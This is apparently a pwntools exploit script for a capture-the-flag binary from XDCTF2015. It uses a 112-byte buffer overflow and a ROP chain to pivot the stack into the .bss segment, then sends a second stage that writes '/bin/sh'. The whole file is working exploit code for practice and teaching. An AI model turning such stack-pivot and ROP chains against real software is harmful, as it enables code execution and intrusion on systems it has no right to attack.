from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()